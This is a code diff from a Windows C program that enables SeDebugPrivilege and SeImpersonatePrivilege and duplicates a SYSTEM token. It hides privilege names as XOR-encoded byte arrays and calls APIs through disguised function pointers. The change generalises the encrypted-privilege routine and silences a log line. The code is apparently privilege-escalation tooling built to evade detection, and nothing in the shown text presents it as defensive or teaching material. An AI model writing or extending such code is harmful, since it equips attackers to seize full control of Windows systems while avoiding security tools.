@@ -7,19 +7,6 @@
 // Functions to get needed privileges
 // ========================================
 
-// SeDebugPrivilege
-static const unsigned char SE_DEBUG_ENC[] = { 0x63, 0x54, 0x76, 0x56, 0x56, 0x40, 0x51, 0x67, 0x4A, 0x50, 0x17, 0x0B, 0x0F, 0x01, 0x02, 0x03 };
-// SeImpersonatePrivilege
-static const unsigned char SE_IMP_ENC[] = { 0x63, 0x54, 0x7B, 0x5E, 0x44, 0x50, 0x44, 0x44, 0x57, 0x57, 0x00, 0x16, 0x06, 0x34, 0x17, 0x0F, 0x11, 0x01, 0x05, 0x0F, 0x57, 0x54 };
-
-static const unsigned char* privs[] = {
-    SE_DEBUG_ENC,
-    SE_IMP_ENC
-};
-static const size_t priv_lens[] = {
-    sizeof(SE_DEBUG_ENC),
-    sizeof(SE_IMP_ENC)
-};
 
 BOOL EnablePrivilege(HANDLE hToken, const unsigned char* encryptedPriv, size_t encLen) {
     TOKEN_PRIVILEGES tp;
@@ -69,8 +56,8 @@ void EnableAllPrivileges(HANDLE hToken) {
     }
 }
 
-// Enable only SeDebugPrivilege
-BOOL EnableSEDBGPRV() {
+// Enable encrypted privilege
+BOOL EnableENCPVG(const char* ENC_PRIV) {
     // XOR decryption key is already defined globally as XOR_KEY, key_len
     HANDLE hProc = pGCP();  // GetCurrentProcess
     if (!hProc) {
@@ -104,7 +91,7 @@ BOOL GetSystemTokenAndDuplicate(HANDLE* hSystemToken) {
     PROCESSENTRY32W pe = { 0 };
     pe.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE hSnapshot = pCTH(TH32CS_SNAPPROCESS, 0);
-    log_info("Snapshot handle: %p", hSnapshot);
+    // log_info("Snapshot handle: %p", hSnapshot);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
         fprintf(logfile, "pCTH  error: %u", GetLastError());
         return FALSE;
